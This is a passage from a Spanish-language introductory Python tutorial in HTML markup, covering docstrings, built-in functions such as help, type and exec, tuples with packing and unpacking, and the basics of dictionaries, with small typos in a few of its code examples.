&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable1,variable2,variable3 = mi_funcion()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora imprimo las variables&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(var1)

print(var2)

print(var3)

texto1
texto2
texto3
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;docstrings&quot;&gt;Docstrings&lt;/h2&gt;

&lt;p&gt;Los &lt;code&gt;docstring&lt;/code&gt; los utilizamos para proporcionar la documentación de una &lt;code&gt;función&lt;/code&gt;. Como el propósito de la función, los argumentos que va a tomar, información sobre los valores de retorno, o cualquier otra información que consideremos útil.&lt;/p&gt;

&lt;p&gt;Cuando la primera declaración en el cuerpo de una &lt;code&gt;función&lt;/code&gt; en &lt;code&gt;Python&lt;/code&gt; es un string de la forma &lt;code&gt;&quot;&quot;&quot;texto&quot;&quot;&quot;&lt;/code&gt;, esto es lo que se conoce como &lt;code&gt;docstring&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Aqui tenemos un ejemplo de como lo podemos definir:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion():
    &quot;&quot;&quot;Esto es un docstring de nuestra función&quot;&quot;&quot;
    print(&quot;Hola Python&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tambien podemos definir &lt;code&gt;docstring&lt;/code&gt; de varias lineas.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion2(argumento1=4, argumento2=8):
    &quot;&quot;&quot;Este es un docstring de varias líneas.

    Argumentos:
    argumento1 -- primer argumento de la funcion (valor por defecto 4)
    argumento2 -- segundo argumento de la funcion (valor por defecto 8)
    &quot;&quot;&quot;
    return
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;funciones-propias-de-python&quot;&gt;Funciones Propias de Python&lt;/h2&gt;

&lt;p&gt;El intérprete de &lt;code&gt;Python&lt;/code&gt; tiene una serie de funciones que están siempre disponibles. A continuación se enumeran en orden alfabético.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt; &lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt; &lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;strong&gt;Lista de Funciones&lt;/strong&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt; &lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt; &lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;abs()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;delattr()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;hash()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;memoryview()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;set()&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;all()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;dict()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;help()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;min()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;setattr()&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;any()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;dir()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;hex()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;next()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;slice()&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;ascii()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;divmod()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;id()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;object()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;sorted()&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;bin()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;enumerate()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;input()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;oct()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;staticmethod()&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;bool()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;eval()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;int()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;open()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;str()&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;breakpoint()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;exec()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;isinstance()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;ord()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;sum()&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;bytearray()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;filter()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;issubclass()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;pow()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;super()&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;bytes()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;float()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;iter()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;print()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;tuple()&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;callable()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;format()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;len()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;property()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;type()&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;chr()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;frozenset()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;list()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;range()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;vars()&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;classmethod()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;getattr()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;locals()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;repr()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;(zip)&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;compile()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;globals()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;map()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;reversed()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;__import__()&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;complex()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;hasattr()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;max()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;round()&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Estas son todas las funciones disponibles que estan integradas en &lt;code&gt;python&lt;/code&gt;. A continuación veremos algunas de las mas importantes, pero no esta de mas practicar para ver de que trata cada una de ellas.&lt;/p&gt;

&lt;p&gt;Comenzaremos con la función &lt;code&gt;help&lt;/code&gt; que se utiliza para mostrar la documentación de un &lt;code&gt;objeto&lt;/code&gt;. Si la invocamos sin asignarle ningun objeto y me saldra una sesión interactiva donde podemos introducir algo sobre lo que queremos saber su información, en este caso introduciremos &lt;code&gt;len&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;help()

Welcome to Python 3.10's help utility!

If this is your first time using Python, you should definitely check out
the tutorial on the Internet at https://docs.python.org/3.9/tutorial/.

Enter the name of any module, keyword, or topic to get help on writing
Python programs and using Python modules.  To quit this help utility and
return to the interpreter, just type &quot;quit&quot;.

To get a list of available modules, keywords, symbols, or topics, type
&quot;modules&quot;, &quot;keywords&quot;, &quot;symbols&quot;, or &quot;topics&quot;.  Each module also comes
with a one-line summary of what it does; to list the modules whose name
or summary contain a given string such as &quot;spam&quot;, type &quot;modules spam&quot;.

help&amp;gt; len
Help on built-in function len in module builtins:

len(obj, /)
    Return the number of items in a container.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como vemos despues de introducir la función &lt;code&gt;len&lt;/code&gt; nos dice que es una función que nos retorna el numero de elementos que tiene un objeto que le proporcione como elemento.&lt;/p&gt;

&lt;p&gt;Continuando con otras funciones vamos a utilizar &lt;code&gt;help&lt;/code&gt; ahora con &lt;code&gt;print&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;help(print)

Help on built-in function print in module builtins:

print(...)
    print(value, ..., sep=' ', end='\n', file=sys.stdout, flush=False)
    
    Prints the values to a stream, or to sys.stdout by default.
    Optional keyword arguments:
    file:  a file-like object (stream); defaults to the current sys.stdout.
    sep:   string inserted between values, default a space.
    end:   string appended after the last value, default a newline.
    flush: whether to forcibly flush the stream.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Probemos entonces. Aqui estariamos utilizando los valores por defecto.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(&quot;Hola Python&quot;)

Hola mundo
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora tambien podemos pasarle dos valores, pueden ser de cualquier valor.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(&quot;Soy el numero&quot;, 1)

Soy el numero 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Probemos ahora la opción &lt;code&gt;sep&lt;/code&gt; que nos muestro al usar &lt;code&gt;help&lt;/code&gt;. Lo que hara sera separarnos los valores por lo que introduzcamos en &lt;code&gt;sep&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(&quot;Soy el numero&quot;, 1, sep=&quot;:&quot;)

Soy el numero:1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Continuemos con otras funciones importantes que ya habiamos visto un poco antes. Concretamente seria &lt;code&gt;int, str y float&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Vamos a definir primero una serie de variables.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto = &quot;10&quot; # esta variable es una string
numero_int = 10 # esta variable corresponde a un int
numero_float = 10.6 # esta variable es un float
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seguidamente vamos a probar estas funciones:&lt;/p&gt;

&lt;p&gt;Si usamos &lt;code&gt;int&lt;/code&gt; en la variable de texto esta nos la devolvera como entero.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;int(texto)

10
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y si ahora usamos la función &lt;code&gt;str&lt;/code&gt; sobre el entero, pues nos devolvera la variable transformada a string.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;str(numero_int)

'10'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Aplicando lo mismo con un &lt;code&gt;float&lt;/code&gt; nos devolveria el resultado en flotante.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;float(numero_int)

10.0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Otra de las funciones importantes es &lt;code&gt;type&lt;/code&gt; que lo que hace es retornar el tipo del objeto que le proporcionamos como argumento.&lt;/p&gt;

&lt;p&gt;Veamosla a continuación:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;type(10)

int

type(&quot;10&quot;)

str

type(10.5)

float
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podriamos hacerlo para cualquier tipo de dato.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [1, 2, 3, 4]

type(lista)

list
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tenemos tambien a la función &lt;code&gt;id&lt;/code&gt; que la vimos anteriormente. Y como mencioamos al pasarle un objeto nos dara como valor un numero asociado a la porción de memoria que este ocupa en la memoria.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto = &quot;Hola Python&quot;

id(texto)

139906352396400
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Veamos ahora la función &lt;code&gt;exec&lt;/code&gt;, que ejecuta el codigo que le pasemos como argumento en formato string.&lt;/p&gt;

&lt;p&gt;Definimos una variable que contiene una sentencia &lt;code&gt;print&lt;/code&gt;. Que si la ejecutamos con &lt;code&gt;exec&lt;/code&gt; nos va a relizar la ejecución de lo que contenia nuestra variable.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = &quot;print('Hola Python')&quot;

exec(variable)

Hola Python
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tambien podemos tener funciones como &lt;code&gt;round&lt;/code&gt; que sirve para redondear un valor, &lt;code&gt;max y min&lt;/code&gt; para obtener el valor maximo y minimo y &lt;code&gt;range&lt;/code&gt; para obtener un rango de numeros asociados.&lt;/p&gt;

&lt;p&gt;Lo recomendable es hechar un ojo a cada una de ellas para saber en que consiste cada una, pero cabe mencionar que la mayoria de ellas las veremos a lo largo del curso.&lt;/p&gt;

&lt;h1 id=&quot;tuplas&quot;&gt;Tuplas &lt;a href=&quot;#tuplas&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Una tupla viene a ser un objeto identico a una lista excepto por dos propiedades:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Definen una colección ordenada de objetos, sin embargo utilizan &lt;code&gt;()&lt;/code&gt; en la sintaxis (objeto1, objeto2, …, objetojn)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;A diferencia que las lista, las tuplas son tipos de datos inmutables&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;La representación dentro de &lt;code&gt;python&lt;/code&gt; con el tipo de dato &lt;code&gt;tuple&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Veamoslo a continuación&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;tupla = (1, 2, 3, 4, 5)

type(tupla)

tuple
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Se pueden aplicar todas las funciones que aplicabamos a las listas.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(tupla)

(1, 2, 3, 4, 5)

len(tupla)

5
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;funcionamiento-de-las-tuplas&quot;&gt;Funcionamiento de las Tuplas&lt;/h2&gt;

&lt;p&gt;Podemos mezclar todo tipo de datos en una tupla, al igual que podemos usar conceptos como &lt;code&gt;slide&lt;/code&gt;, &lt;code&gt;stride&lt;/code&gt; y &lt;code&gt;slicing&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;tupla = (1, 2, 3, &quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;)

print(tupla)

(1, 2, 3, 'text1', 'text2', 'text3')

tupla[0:4]

(1, 2, 3, text1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como mencionaba antes y hay que tenerlo muy presente es que las tuplas no pueden modificarse, ya que son inmutables y si tratamos de hacerlo &lt;code&gt;python&lt;/code&gt; nos dara un error.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;tupla = (1, 2, 3, &quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;)

tupla[2] = &quot;texto0&quot;

---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-7-6b0bedb66139&amp;gt; in &amp;lt;module&amp;gt;
----&amp;gt; 1 tupla[2] = &quot;texto0&quot;

TypeError: 'tuple' object does not support item assignment
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora seguro te preguntaras, si ya tenemos listas que son un objeto super potente en &lt;code&gt;python&lt;/code&gt; y a diferencia de las  &lt;code&gt;tuplas&lt;/code&gt;, estas si podemos modificarlas. Entonces ¿Por que usaria una tupla?&lt;/p&gt;

&lt;p&gt;Pues esto lo veremos a continuación.&lt;/p&gt;

&lt;h2 id=&quot;cuando-utilizar-una-tupla-en-vez-de-una-lista&quot;&gt;Cuando utilizar una tupla en vez de una lista&lt;/h2&gt;

&lt;p&gt;Existen algunos casos donde es mas recomendable usar tuplas en lugar de lista.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Cuando se manipula una &lt;code&gt;tupla&lt;/code&gt;, la ejecución del programa es mucho mas rapida. Esto cuando utilizamos una &lt;code&gt;lista&lt;/code&gt; o &lt;code&gt;tupla&lt;/code&gt; con muchos elementos.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;El uso de una &lt;code&gt;tupla&lt;/code&gt; protege contra una modificación accidental&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Existe un tipo de dato llamado &lt;code&gt;diccionario&lt;/code&gt; que lo veremos un poco mas adelante, que requiere como uno de sus componentes un valor inmutable. Por ello una &lt;code&gt;tupla&lt;/code&gt; puede utilizarse para este proposito mientras que una &lt;code&gt;lista&lt;/code&gt; no.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Podemos usar el &lt;code&gt;empaquetado&lt;/code&gt; y &lt;code&gt;desempaquetado&lt;/code&gt; que lo veremos un poquito mas adelante&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para cualquier otro caso de uso que no sean los que hago mención, es mucho mas recomendable el uso de una &lt;code&gt;lista&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;tuplas-y-tipos-de-datos-numericos&quot;&gt;Tuplas y tipos de datos Numericos&lt;/h2&gt;

&lt;p&gt;Debemos de tener cuidado al momento que definimos una tupla con un único elemento de tipo numérico. Python puede llegar a interpretar los paréntesis como parte de la expresión matemática y definirlo como un tipo de dato numérico en lugar de una tupla.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;tupla = (4)

tupla

4

type(tupla)

int
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para solucionar esto, podemos hacer uso de la sintaxis (numero,)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;tupla = (4,)

tupla

(4,)

type(tupla)

tuple
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;packing-y-unpacking---empaquetado-y-desempaquetado&quot;&gt;Packing y Unpacking - Empaquetado y Desempaquetado&lt;/h2&gt;

&lt;p&gt;Anteriormente pudimos ver como una &lt;code&gt;tupla&lt;/code&gt; con varios elementos puede asignarse a una unica variable.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mitupla = (1, 2, 3, 4)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No obstante, una &lt;code&gt;tupla&lt;/code&gt; nos permite usar la estructura de &lt;code&gt;empaquetado&lt;/code&gt; y &lt;code&gt;desempaquetado&lt;/code&gt;. Esto quiere decir que podemos asignar los elementos de una &lt;code&gt;tupla&lt;/code&gt; a distintas variables simultaneamente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mitupla = (1, 2, 3, 4)

print(mitupla)

(1, 2, 3, 4)

numero1, numero2, numero3, numero4 = mitupla
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De modo que si ahora yo muestro las variables, corresponderan a los que teniamos en la &lt;code&gt;tupla&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(numero1)

1

print(numero2)

2

print(numero3)

3

print(numero4)

4
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Una cosa a tener en cuenta es que al realizar este proceso, el numero de variables que pongamos deben de coincidir con el numero de elementos de la &lt;code&gt;tupla&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ya que si asigno un valor menor o mayor, &lt;code&gt;python&lt;/code&gt; me mostrara un error.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1, numero2, numero3 = mitupla

---------------------------------------------------------------------------
ValueError                                Traceback (most recent call last)
Cell In[7], line 2
      1 # El número de variables debe coincidir con el número de elementos de la tupla
----&amp;gt; 2 numero1, numero2, numero3 = tupla

ValueError: too many values to unpack (expected 3)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Este concepto de &lt;code&gt;desempaquetado&lt;/code&gt; o &lt;code&gt;Unpacking&lt;/code&gt; tambien nos permite devolver varios elementos en una función y asignarlos a varias variables.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def funcion():

    return 1,2

func()

(1, 2)

numero1, numero2 = func()

print(numero1)

1

print(numero2)

2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Otra cosa a mencioanr que es bastante interesante es que podemos definir una tupla sin usar &lt;code&gt;()&lt;/code&gt;. Es algo muy raro de &lt;code&gt;python&lt;/code&gt; que quiza pueda causar confusión, por ello recomiendo siempre mantener buenas practicas y usar &lt;code&gt;()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python3&quot;&gt;tupla = 1, 2, 3

type(tupla)

tuple
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;diccionarios&quot;&gt;Diccionarios &lt;a href=&quot;#diccionarios&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Los diccionarios son un tipo de dato complejo y particular en &lt;code&gt;Python&lt;/code&gt; que corresponden con una colección de elementos &lt;code&gt;clave-valor&lt;/code&gt;. Cada elemento &lt;code&gt;clave-valor&lt;/code&gt; asocia la clave con un valor determinado.&lt;/p&gt;

&lt;p&gt;Para representar los &lt;code&gt;diccionarios&lt;/code&gt; dentro de python lo hacemos con el tipo de dato &lt;code&gt;dict&lt;/code&gt;. La sintaxis utilizada para definir diccionarios es la siguiente: &lt;code&gt;{clave:valor1, clave2:valor2, ..., claven:valorn}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Como podemos observar a diferencias de las listas y las tuplas usamos las &lt;code&gt;{}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Veamos a continuación un ejemplo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;diccionario = {
    &quot;Nombre&quot;:&quot;firtsmiracle&quot;,
    &quot;Curso&quot;:&quot;Python&quot;,
    &quot;Idioma&quot;:&quot;Español&quot;,
    &quot;Nivel&quot;:&quot;Todos los Niveles&quot;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como vemos los &lt;code&gt;diccionarios&lt;/code&gt; nos permiten especificar un contexto sobre cada uno de los objetos, y de esta manera podemos tener una referencia de los objetos contenidos en la clave.&lt;/p&gt;

&lt;p&gt;Al imprimirlo tendriamos lo siguiente:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(diccionario)

{'Nombre': 'firtsmiracle', 'Curso': 'Python', 'Idioma': 'Español', 'Nivel': 'Todos los Niveles'}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y si le ahora usamos la función integrada &lt;code&gt;type&lt;/code&gt; podemos ver que efectivamente nuestro dato corresponde a un &lt;code&gt;diccionario&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;type(diccionario)

dict
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora tambien existe una forma de definir un &lt;code&gt;diccionario&lt;/code&gt;, aunque es un poco inusual. Para ellos la sisntaxis que debemos usar es definir una variable y usaremos la función &lt;code&gt;dict&lt;/code&gt; que recibira una serie de argumentos que seran la &lt;code&gt;clave&lt;/code&gt; y el &lt;code&gt;valor&lt;/code&gt;. Pero esta vez la &lt;code&gt;clave&lt;/code&gt; no sera declarada como un &lt;code&gt;string&lt;/code&gt;, sino como un argumento y la igualamos al valor que queremos que tenga.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-pyhon&quot;&gt;diccionario2 = dict(
    Nombre=&quot;firtsmiracle&quot;,
    Curso=&quot;Python&quot;,
    Idioma=Español&quot;,
    Nivel=&quot;Todos los Niveles&quot;
)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y si ahora sacamos este &lt;code&gt;diccionario&lt;/code&gt; por pantalla, sera exactamente el mismo que definimos previamente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(diccionario2)

